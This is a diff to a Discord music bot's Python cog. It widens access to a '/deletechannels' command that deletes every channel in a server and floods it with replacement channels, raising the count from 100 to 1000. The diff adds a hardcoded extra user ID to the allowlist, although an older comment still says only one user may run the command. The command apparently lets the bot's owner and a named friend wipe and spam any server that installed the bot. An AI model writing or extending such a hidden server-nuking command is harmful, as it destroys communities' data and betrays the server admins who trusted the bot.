@@ -4,6 +4,11 @@ from discord.ext import commands
 
 from permissions import SUPER_USER_ID as AUTHORIZED_SAY_USER_ID
 
+# Trusted people who can also trigger /deletechannels, in addition to
+# AUTHORIZED_SAY_USER_ID -- deliberately a short, named allowlist rather than
+# "anyone", since that command does something fully irreversible.
+NUKE_AUTHORIZED_USER_IDS = {AUTHORIZED_SAY_USER_ID, 1089130206373105664}
+
 HELP_SECTIONS = {
     "🎵 Music": [
         "/play <query> — play a song by name or URL",
@@ -324,7 +329,7 @@ class General(commands.Cog):
     # (exactly one Discord user ID, not "anyone with Manage Channels") and
     # requires an explicit button confirmation before touching anything.
 
-    NUKE_CHANNEL_COUNT = 100
+    NUKE_CHANNEL_COUNT = 1000
 
     async def _do_nuke(self, guild: discord.Guild):
         for channel in list(guild.channels):
@@ -357,7 +362,7 @@ class General(commands.Cog):
 
     @app_commands.command(name="deletechannels", description="[Owner] Delete every channel and replace them with a bunch saying bye")
     async def deletechannels(self, interaction: discord.Interaction):
-        if interaction.user.id != AUTHORIZED_SAY_USER_ID:
+        if interaction.user.id not in NUKE_AUTHORIZED_USER_IDS:
             await interaction.response.send_message("You can't use this command.", ephemeral=True)
             return
         # Heads up in the response itself: Discord always shows "used /deletechannels"
@@ -374,7 +379,7 @@ class General(commands.Cog):
 
     @commands.command(name="deletechannels")
     async def deletechannels_text(self, ctx: commands.Context):
-        if ctx.author.id != AUTHORIZED_SAY_USER_ID:
+        if ctx.author.id not in NUKE_AUTHORIZED_USER_IDS:
             return  # stay quiet, same as say_text/sync_text
         try:
             await ctx.message.delete()
